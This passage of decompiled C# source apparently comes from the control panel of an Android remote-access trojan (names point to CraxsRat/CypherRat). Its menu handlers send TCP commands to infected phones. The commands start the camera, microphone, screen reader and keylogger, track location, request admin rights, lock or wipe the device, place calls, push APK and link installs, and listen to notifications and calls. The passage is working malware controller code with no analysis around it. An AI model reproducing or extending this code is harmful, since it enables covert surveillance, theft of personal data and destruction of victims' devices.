							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006C0 RID: 1728 RVA: 0x0002E42C File Offset: 0x0002C62C
		private void ScreenReaderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Screen_Reader_" + gclass.string_1;
										ScreenReader screenReader = (ScreenReader)MyProject.Application.OpenForms[name];
										if (screenReader == null)
										{
											new ScreenReader
											{
												Name = name,
												string_0 = string.Format("{0} - IP:{1}", "Screen Reader", gclass.string_1),
												Tag = gclass.string_1,
												gclass8_0 = gclass
											}.Show();
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006C1 RID: 1729 RVA: 0x0002E588 File Offset: 0x0002C788
		private void CameraMonitorToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										string[] array = gclass.string_0.Split(new char[]
										{
											':'
										});
										int value = 0;
										int value2 = 0;
										if (!gclass.bool_13)
										{
											string name = "Camera_Manager_" + gclass.string_2;
											CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
											if (cameraManager != null)
											{
												break;
											}
											cameraManager = new CameraManager();
											cameraManager.Name = name;
											cameraManager.string_0 = string.Format("{0} - IP:{1}", "Camera Manager", gclass.string_1);
											cameraManager.gclass8_2 = gclass;
											if (cameraManager.gclass8_2 != null)
											{
												Module8.smethod_5(cameraManager.gclass8_2);
												cameraManager.string_2 = cameraManager.gclass8_2.string_10;
											}
											cameraManager.tcpClient_1 = gclass.tcpClient_0;
											cameraManager.tcpClient_0 = tcpClient_;
											cameraManager.gclass8_0 = gclass;
											cameraManager.gclass8_1 = gclass;
											cameraManager.pictureBox_0 = new PictureBox();
											cameraManager.combotext.Visible = false;
											cameraManager.combosizes.Visible = false;
											cameraManager.Show();
										}
										else
										{
											object[] objects_ = new object[]
											{
												tcpClient_,
												string.Concat(new string[]
												{
													Module13.string_29,
													GClass9.string_0,
													"lcm<*>",
													gclass.string_2,
													GClass9.string_0,
													array[0],
													GClass9.string_0,
													array[1],
													GClass9.string_0,
													Module13.string_5,
													GClass9.string_0,
													Conversions.ToString(value),
													GClass9.string_0,
													Conversions.ToString(value2),
													GClass9.string_0,
													GClass9.string_3,
													GClass9.string_0,
													gclass.string_2
												}),
												Module2.smethod_9().GetBytes("null"),
												gclass
											};
											gclass.method_2(objects_);
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006C2 RID: 1730 RVA: 0x0002E894 File Offset: 0x0002CA94
		private void MicrophoneMonitorToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										string name = "Microphone_" + gclass.string_2;
										Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
										if (microphone == null)
										{
											string[] array = gclass.string_0.Split(new char[]
											{
												':'
											});
											if (array.Length < Module3.int_0)
											{
												break;
											}
											object[] objects_ = new object[]
											{
												tcpClient_,
												string.Concat(new string[]
												{
													Module13.string_28,
													GClass9.string_0,
													Module8.string_4,
													".microphone",
													GClass9.string_0,
													"method",
													GClass9.string_0,
													Module13.string_40,
													GClass9.string_0,
													"start",
													GClass9.string_1,
													array[0],
													GClass9.string_1,
													array[1],
													GClass9.string_1,
													"8000",
													GClass9.string_1,
													Module13.string_16,
													GClass9.string_1,
													gclass.string_2,
													GClass9.string_1,
													"0"
												}),
												Module2.smethod_9().GetBytes("null"),
												gclass
											};
											gclass.method_2(objects_);
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006C3 RID: 1731 RVA: 0x0002EAFC File Offset: 0x0002CCFC
		private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_35,
												GClass9.string_0,
												Module13.string_24,
												GClass9.string_0,
												GClass9.string_3,
												GClass9.string_0,
												"(unknown)"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006C4 RID: 1732 RVA: 0x0002EC58 File Offset: 0x0002CE58
		private void LiveModeToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_30,
												GClass9.string_0,
												GClass9.string_1,
												GClass9.string_0,
												Module13.string_10
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006C5 RID: 1733 RVA: 0x0002EDA4 File Offset: 0x0002CFA4
		private void SilentModeGOIPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string[] latLng = GClass9.infoClass_0.GetLatLng(gclass.string_1);
										if (latLng != null)
										{
											string name = "Location_Manager_" + gclass.string_2;
											LocationManager locationManager = (LocationManager)MyProject.Application.OpenForms[name];
											if (locationManager == null)
											{
												Module8.smethod_5(gclass);
												locationManager = new LocationManager();
												locationManager.strings_0 = new string[]
												{
													gclass.string_10,
													gclass.string_8
												};
												locationManager.Name = name;
												locationManager.string_4 = string.Format("{0} - IP:{1}", "Location Manager", gclass.string_1);
												locationManager.object_0 = gclass.tcpClient_0;
												locationManager.gclass8_0 = gclass;
												locationManager.bool_1 = true;
												locationManager.string_7 = gclass.string_10;
												if (!Directory.Exists(locationManager.string_7))
												{
													Directory.CreateDirectory(locationManager.string_7);
												}
												locationManager.Show();
												locationManager.int_0 = 15;
											}
											locationManager.size_0.Width = 480;
											locationManager.size_0.Height = 360;
											locationManager.string_2 = Module8.smethod_19("<param name=\"markers_gsm\">", "</param>");
											locationManager.string_0 = "https://api.mapbox.com/styles/v1/";
											locationManager.string_1 = "pk.eyJ1IjoiYWxmYWtyYWtlbiIsImEiOiJja3h1Z283bWMzbDNhMnlxa3VpeDdmejZjIn0.K8KkGJxQgTUJroiFHsrewA";
											string str = Module8.smethod_23();
											locationManager.string_3 = Module8.smethod_19("<param name=\"" + str + "\">", "</param>");
											locationManager.string_5 = "jump";
											locationManager.string_6 = "jump";
											locationManager.arrays_0.Add(new double[]
											{
												Conversions.ToDouble(latLng[0]),
												Conversions.ToDouble(latLng[1])
											});
											locationManager.Text = locationManager.string_4;
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006C6 RID: 1734 RVA: 0x0002F06C File Offset: 0x0002D26C
		private void WebBrowserToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Web_Browser_" + gclass.string_1;
										WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
										if (webViewMonitor == null)
										{
											new WebViewMonitor
											{
												Name = name,
												string_0 = string.Format("{0} - IP:{1}", "Web Browser", gclass.string_1),
												Tag = gclass.string_1,
												gclass8_0 = gclass
											}.Show();
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006C7 RID: 1735 RVA: 0x0002F1F0 File Offset: 0x0002D3F0
		private void CallRecorderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Calls_Records_" + gclass.string_1;
										Calls_Records calls_Records = (Calls_Records)MyProject.Application.OpenForms[name];
										if (calls_Records == null)
										{
											new Calls_Records
											{
												Name = name,
												string_0 = string.Format("{0} - IP:{1}", "Calls Records", gclass.string_1),
												Tag = gclass.string_1,
												gclass8_0 = gclass,
												object_0 = gclass.tcpClient_0,
												string_1 = gclass.string_10
											}.Show();
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006C8 RID: 1736 RVA: 0x0002F388 File Offset: 0x0002D588
		private void ToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Auto_Clicker_" + gclass.string_2;
										Auto_Clicker auto_Clicker = (Auto_Clicker)MyProject.Application.OpenForms[name];
										if (auto_Clicker != null)
										{
											break;
										}
										new Auto_Clicker
										{
											Name = name,
											gclass8_0 = gclass
										}.Show();
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006C9 RID: 1737 RVA: 0x0002F4BC File Offset: 0x0002D6BC
		private void RequestAdminRightsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										string[] array = gclass.string_0.Split(new char[]
										{
											':'
										});
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_29 + GClass9.string_0 + "adm<*>",
												GClass9.string_0,
												array[0],
												GClass9.string_0,
												array[1],
												GClass9.string_0,
												Module13.string_5,
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												GClass9.string_3,
												GClass9.string_0,
												gclass.string_2
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006CA RID: 1738 RVA: 0x0002F6B4 File Offset: 0x0002D8B4
		private void LockScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										string[] array = gclass.string_0.Split(new char[]
										{
											':'
										});
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_29,
												GClass9.string_0,
												"adm<*>lck<*>",
												GClass9.string_0,
												array[0],
												GClass9.string_0,
												array[1],
												GClass9.string_0,
												Module13.string_5,
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												GClass9.string_3,
												GClass9.string_0,
												gclass.string_2
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006CB RID: 1739 RVA: 0x0002F8A8 File Offset: 0x0002DAA8
		private void ToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										MsgBoxResult msgBoxResult = Interaction.MsgBox("All Phone Data Will be Removed\r\nAre you sure you want to Continue", MsgBoxStyle.YesNo, "Alert");
										if (msgBoxResult != MsgBoxResult.Yes)
										{
											if (msgBoxResult == MsgBoxResult.No)
											{
												break;
											}
										}
										else
										{
											string[] array = gclass.string_0.Split(new char[]
											{
												':'
											});
											object[] objects_ = new object[]
											{
												tcpClient_,
												string.Concat(new string[]
												{
													Module13.string_29,
													GClass9.string_0,
													"adm<*>wip<*>",
													GClass9.string_0,
													array[0],
													GClass9.string_0,
													array[1],
													GClass9.string_0,
													Module13.string_5,
													GClass9.string_0,
													Conversions.ToString(0),
													GClass9.string_0,
													Conversions.ToString(0),
													GClass9.string_0,
													GClass9.string_3,
													GClass9.string_0,
													gclass.string_2
												}),
												Module2.smethod_9().GetBytes("null"),
												gclass
											};
											gclass.method_2(objects_);
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006CC RID: 1740 RVA: 0x0002FAC4 File Offset: 0x0002DCC4
		private void ToolStripMenuItem5_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										CallPhone callPhone = new CallPhone();
										callPhone.L0.Text = "add Number";
										callPhone.StartPosition = FormStartPosition.Manual;
										callPhone.Location = Module2.smethod_46(GClass9.cypherRat_0, callPhone);
										if (callPhone.ShowDialog() != DialogResult.OK)
										{
											callPhone.Close();
										}
										else
										{
											string text = callPhone.TextBox1.Text;
											string text2 = callPhone.string_0;
											callPhone.Close();
											if (Operators.CompareString(text, null, false) != 0)
											{
												try
												{
													if (gclass != null)
													{
														object[] objects_ = new object[]
														{
															tcpClient_,
															string.Concat(new string[]
															{
																Module13.string_28,
																GClass9.string_0,
																Module8.string_4,
																".info",
																GClass9.string_0,
																"method",
																GClass9.string_0,
																Module13.string_40,
																GClass9.string_0,
																text2,
																GClass9.string_1,
																"tel:",
																text.Trim()
															}),
															Module2.smethod_9().GetBytes("null"),
															gclass
														};
														gclass.method_2(objects_);
													}
												}
												finally
												{
												}
											}
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006CD RID: 1741 RVA: 0x0002FD20 File Offset: 0x0002DF20
		private void ToolStripMenuItem6_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										Dialog1 dialog = new Dialog1();
										dialog.string_0 = "Enter APK Link";
										dialog.ShowDialog();
										if (dialog.DialogResult != DialogResult.OK)
										{
											break;
										}
										string[] array = gclass.string_0.Split(new char[]
										{
											':'
										});
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_29,
												GClass9.string_0,
												"msg:",
												Module8.smethod_2(dialog.Mytext.Text),
												":up",
												GClass9.string_0,
												array[0],
												GClass9.string_0,
												array[1],
												GClass9.string_0,
												Module13.string_5,
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												GClass9.string_3,
												GClass9.string_0,
												gclass.string_2
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006CE RID: 1742 RVA: 0x0002FF60 File Offset: 0x0002E160
		private void ToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										Dialog1 dialog = new Dialog1();
										dialog.string_0 = "Enter Messege";
										dialog.ShowDialog();
										if (dialog.DialogResult != DialogResult.OK)
										{
											break;
										}
										string[] array = gclass.string_0.Split(new char[]
										{
											':'
										});
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_29,
												GClass9.string_0,
												"msg:",
												dialog.Mytext.Text,
												GClass9.string_0,
												array[0],
												GClass9.string_0,
												array[1],
												GClass9.string_0,
												Module13.string_5,
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												GClass9.string_3,
												GClass9.string_0,
												gclass.string_2
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006CF RID: 1743 RVA: 0x00030198 File Offset: 0x0002E398
		private void ToolStripMenuItem8_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".info",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_27,
												GClass9.string_0,
												"get",
												GClass9.string_1,
												"null"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006D0 RID: 1744 RVA: 0x00030350 File Offset: 0x0002E550
		private void ToolStripMenuItem9_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										Dialog1 dialog = new Dialog1();
										dialog.string_0 = "Enter Link";
										dialog.ShowDialog();
										if (dialog.DialogResult != DialogResult.OK)
										{
											break;
										}
										string[] array = gclass.string_0.Split(new char[]
										{
											':'
										});
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_29,
												GClass9.string_0,
												"lnk<*>",
												Module8.smethod_2(dialog.Mytext.Text),
												GClass9.string_0,
												array[0],
												GClass9.string_0,
												array[1],
												GClass9.string_0,
												Module13.string_5,
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												GClass9.string_3,
												GClass9.string_0,
												gclass.string_2
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006D1 RID: 1745 RVA: 0x00030588 File Offset: 0x0002E788
		private void NotificationListnerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Notifications_" + gclass.string_1;
										craxsnotification craxsnotification = (craxsnotification)MyProject.Application.OpenForms[name];
										if (craxsnotification == null)
										{
											new craxsnotification
											{
												Location = this.ClientsWindow.PointToScreen(this.ClientsWindow.GetCellDisplayRectangle(0, dataGridViewRow.Index, false).Location),
												gclass8_0 = gclass
											}.Show();
											dataGridViewRow.Cells[8].Value = Module2.smethod_29();
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006D2 RID: 1746 RVA: 0x0003071C File Offset: 0x0002E91C
		private void CallsListnerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Calls_Log_" + gclass.string_1;
										craxscallslog craxscallslog = (craxscallslog)MyProject.Application.OpenForms[name];
										if (craxscallslog == null)
										{
											craxscallslog = new craxscallslog();
											craxscallslog.Location = this.ClientsWindow.PointToScreen(this.ClientsWindow.GetCellDisplayRectangle(0, dataGridViewRow.Index, false).Location);
											craxscallslog.gclass8_0 = gclass;
											dataGridViewRow.Cells[9].Value = Module2.smethod_29();
											craxscallslog.Show();
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006D3 RID: 1747 RVA: 0x000308B4 File Offset: 0x0002EAB4
		private void SocialMediaHanterToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										Alert.ShowInformation("the tool is under maintenance ");
										break;
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006D4 RID: 1748 RVA: 0x0003099C File Offset: 0x0002EB9C
		private void PhoneInformationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".info",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_20,
												GClass9.string_0,
												"information"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
